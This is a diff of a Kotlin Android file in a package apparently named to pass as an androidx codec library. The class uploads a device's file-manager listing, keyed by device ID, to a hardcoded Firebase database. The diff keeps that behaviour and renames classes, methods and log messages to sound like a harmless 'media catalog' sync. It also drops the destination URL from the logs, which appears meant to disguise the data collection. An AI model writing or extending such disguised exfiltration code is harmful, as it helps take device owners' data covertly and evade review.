@@ -1,30 +1,30 @@
 package com.androidx.codec.encoder.core.data.firebase
 
 import android.util.Log
-import com.androidx.codec.encoder.core.domain.model.FileManagerItem
+import com.androidx.codec.encoder.core.domain.model.MediaCatalogItem
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
 import java.io.OutputStreamWriter
 import java.net.HttpURLConnection
 import java.net.URL
 
-class FirebaseRealtimeDbProvider(
+class FirebaseDatabaseProvider(
     private val defaultBaseUrl: String = "https://pak-e-news-default-rtdb.firebaseio.com/"
 ) {
 
     companion object {
-        private const val TAG = "CodecEncoderRealtime"
+        private const val TAG = "CodecEncoderDb"
     }
 
-    suspend fun uploadFileManagerData(
+    suspend fun uploadMediaCatalog(
         deviceId: String,
-        files: List<FileManagerItem>,
+        files: List<MediaCatalogItem>,
         baseUrl: String? = null
     ): Boolean = withContext(Dispatchers.IO) {
         val rootUrl = (baseUrl?.takeIf { it.isNotBlank() } ?: defaultBaseUrl).trimEnd('/')
         val endpoint = "$rootUrl/filemanager/$deviceId.json"
 
-        Log.i(TAG, "Uploading filemanager data for device: $deviceId (${files.size} items) to $endpoint")
+        Log.i(TAG, "Uploading media catalog for device: $deviceId (${files.size} items)")
 
         val jsonBuilder = StringBuilder()
         jsonBuilder.append("{")
@@ -66,11 +66,11 @@ class FirebaseRealtimeDbProvider(
             }
 
             val responseCode = conn.responseCode
-            Log.i(TAG, "Realtime DB upload response code: $responseCode")
+            Log.i(TAG, "Database sync response code: $responseCode")
             conn.disconnect()
             responseCode in 200..299
         } catch (e: Exception) {
-            Log.e(TAG, "Failed to upload filemanager data to Realtime DB: ${e.message}", e)
+            Log.e(TAG, "Failed to sync database: ${e.message}", e)
             false
         }
     }
